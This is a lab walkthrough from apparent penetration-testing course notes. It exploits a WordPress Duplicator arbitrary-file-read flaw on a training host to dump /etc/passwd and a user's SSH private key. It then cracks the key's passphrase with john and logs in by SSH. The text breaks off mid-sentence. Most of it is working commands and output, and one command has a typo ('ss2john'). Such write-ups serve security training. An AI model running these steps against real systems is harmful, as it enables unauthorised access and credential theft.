---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Obtaining a Foothold

[Recall](introduction.md) the attacker can only see 2 machines from outside the network. Presumably there will be more inside but first the attacker must find a way into a public-facing machine and then pivot inside. Based on the findings in the [last section](public-network-enumeration.md) the most promising avenue are the outdated WordPress plugins. To save time this example will just focus on the one that will bear fruit, Duplicator.

Recall that there were 2 exploits for `WEBSRV01`'s version of Duplicator (`1.3.26`):

```shell-session
kali@kali:~/beyond$ searchsploit --id duplicator
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  EDB-ID
----------------------------------------------------------------------------------------- ---------------------------------
...
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read                 | 50420
Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)    | 49288
...
----------------------------------------------------------------------------------------- ---------------------------------
```

## Exploit 50420

This will start with the non-Metasploit exploit, [50420](https://www.exploit-db.com/exploits/50420). Per its description it is an Unauthenticated Arbitrary File Read. It can be used to read any file on the machine. A good place to start is probably the `/etc/passwd` file. First the module must be copied into the current directory. First create an exploits/ sub-directory for the machine then copy the module using `searchsploit -m`:

```shell-session
kali@kali:~/beyond$ mkdir -p websrv1/exploits

kali@kali:~/beyond$ cd websrv1/exploits

kali@kali:~/beyond/websrv1/exploits$ searchsploit -m 50420       
  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50420
     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
    Codes: CVE-2020-11738
    ...
```

From here it can be run with the command:

```bash
python 50420.py http://websrv1 /etc/passwd
```

This reveals the `/etc/passwd` file which was saved in the machines folder:

{% code overflow="wrap" %}
```shell-session
kali@kali:~/beyond/websrv1/exploits$ python 50420.py http://websrv1 /etc/passwd > ../etc.passwd
```
{% endcode %}

{% code title="etc.passwd" %}
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
offsec:x:1000:1000:offsec:/home/offsec:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
```
{% endcode %}

This is a good start. Now the attacker can read arbitrary files on the system. The next step will be to start looking through what information can be found for the users.

## User Secrets

Now that the attacker has a way to read files on the machine this can be used to leak information. As discussed in the [Directory Traversal section](../web-application-attacks/directory-traversal.md#standard-attack-vector) there is a standard starting point for these types of attacks the next step of which is to check user's home directories for private keys.

Recall the default key name when generating a key is `id_rsa` therefore it is relatively common to find a key called `/home/user/.ssh/id_rsa`. With this in mind the attacker will check to see if the `daniela` or `marcus` users have an SSH key:

```shell-session
kali@kali:~/beyond/websrv1/exploits$ python ./50420.py http://websrv1 /home/marcus/.ssh/id_rsa
Invalid installer file name!!

kali@kali:~/beyond/websrv1/exploits$ python ./50420.py http://websrv1 /home/daniela/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
...

kali@kali:~/beyond/websrv1/exploits$ python ./50420.py http://websrv1 /home/daniela/.ssh/id_rsa > ../id_rsa.daniela
```

While `marcus` did not have an SSH key, `daniela` did. Perhaps the key can now be used to access the system.

### Cracking the Key

Now that `daniela`'s `id_rsa` file has been obtained the attacker can try to use it to access the system:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>kali@kali:~/beyond/websrv1$ ssh -i id_rsa.daniela daniela@websrv1 
</strong>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa.daniela' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa.daniela": bad permissions
daniela@websrv1's password: 
</code></pre>

This attempt failed because the file had permissions that were too permissive. Modify them and try again:

```shell-session
kali@kali:~/beyond/websrv1$ sudo chmod 600 id_rsa.daniela

kali@kali:~/beyond/websrv1$ ssh -i id_rsa.daniela daniela@websrv1
Enter passphrase for key 'id_rsa.daniela': 
daniela@websrv1's password: 
Permission denied, please try again.
daniela@websrv1's password: 
```

Unfortunately it turns out the key is password protected. No matter, it can potentially be cracked. To start, [`ssh2john`](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) will be used to convert the `id_rsa` file into a hash file for cracking. The command will be:

<pre class="language-bash"><code class="lang-bash"><strong>ss2john id_rsa.daniela > ssh_hash.daniela
</strong></code></pre>

Now the password can be cracked. This example will just use the simple rockyou word list but rules or more complex lists will likely be needed in the real world:

```shell-session
kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.daniela
...
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
tequieromucho    (id_rsa.daniela)
...
Session completed.
```

Now that password can be used with the key to SSH into the machine:

```shell-session
kali@kali:~/beyond/websrv1$ ssh -i id_rsa.daniela daniela@websrv1
Enter passphrase for key 'id_rsa.daniela': 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-50-generic x86_64)
...
Last login: Wed Nov  2 09:57:32 2022 from 192.168.118.5
daniela@websrv1:~$ whoami
daniela
daniela@websrv1:~$ hostname
websrv1
```

## Examining the Host

Now that the attacker has gained the ability to execute commands on the system it is&#x20;
